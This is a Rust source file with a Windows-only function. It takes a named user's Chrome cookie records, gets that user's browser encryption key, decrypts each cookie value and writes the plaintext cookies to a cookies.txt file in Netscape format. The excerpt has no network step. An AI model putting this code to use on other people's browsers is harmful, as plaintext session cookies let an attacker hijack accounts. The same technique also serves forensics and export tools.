use crate::async_writeln;
#[cfg(windows)]
use crate::encrypted_key::key::get_encryption_key;

use std::{io::ErrorKind, sync::Arc};
use tokio::io::Error;
use tokio::{fs::File, sync::Mutex};

#[cfg(windows)]
use super::cookie_decryption::decrypt_cookie;
use super::cookie_form::UserCookie;

#[cfg(windows)]
pub async fn handle_chrome_cookies(
    username: String,
    cookies: Vec<(String, String, String, i64, Vec<u8>)>,
    filepath: &str,
) -> Result<(), Error> {
    let filepath = if filepath.is_empty() { "." } else { filepath };
    let mut file = match File::create(format!("{}\\cookies.txt", filepath)).await {
        Ok(file) => file,
        Err(_e) => {
            return Err(tokio::io::Error::new(
                ErrorKind::Other,
                "Create folder failure",
            ));
        }
    };

    let cookie_iter = cookies;

    let key = tokio::task::spawn(async move {
        if let Ok(key) = get_encryption_key(username.clone()).await {
            key
        } else {
            vec![]
        }
    })
    .await
    .unwrap();

    if key.is_empty() {
        return Err(tokio::io::Error::new(
            ErrorKind::Other,
            "Key decryption error",
        ));
    }

    let shared_key = Arc::new(Mutex::new(key));

    for cookie in cookie_iter {
        let shared_key_clone = Arc::clone(&shared_key);
        let decrypt_val = tokio::task::spawn(async move {
            let decrypt_val =
                decrypt_cookie(shared_key_clone.lock().await.to_vec(), cookie.4).await;
            decrypt_val
        })
        .await
        .unwrap();

        let cookie_val = if decrypt_val.is_empty() {
            cookie.2
        } else {
            decrypt_val
        };

        let cookies = UserCookie {
            host_key: cookie.0,
            name: cookie.1,
            value: cookie_val,
            expires_utc: (cookie.3 / 1_000_000) - 11644473600,
        };

        async_writeln!(
            file,
            "{}\tTRUE\t/\tFALSE\t{}\t{}\t{}",
            cookies.host_key,
            cookies.expires_utc,
            cookies.name,
            cookies.value
        )
        .unwrap();
    }

    Ok(())
}
